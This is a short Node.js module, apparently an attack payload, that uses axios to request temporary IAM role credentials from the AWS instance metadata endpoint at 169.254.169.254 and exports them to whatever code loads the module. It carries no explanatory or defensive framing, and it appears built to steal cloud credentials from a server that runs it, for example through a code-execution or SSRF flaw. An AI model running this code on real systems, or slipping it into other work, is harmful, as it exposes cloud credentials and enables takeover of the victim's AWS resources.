const axios = require("axios")
module.exports = new Promise((resolve, reject) => {})

module.exports = (async function () {
  let result = await axios.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-full-access-s3-feeco-created-role")
  return result.data
})()
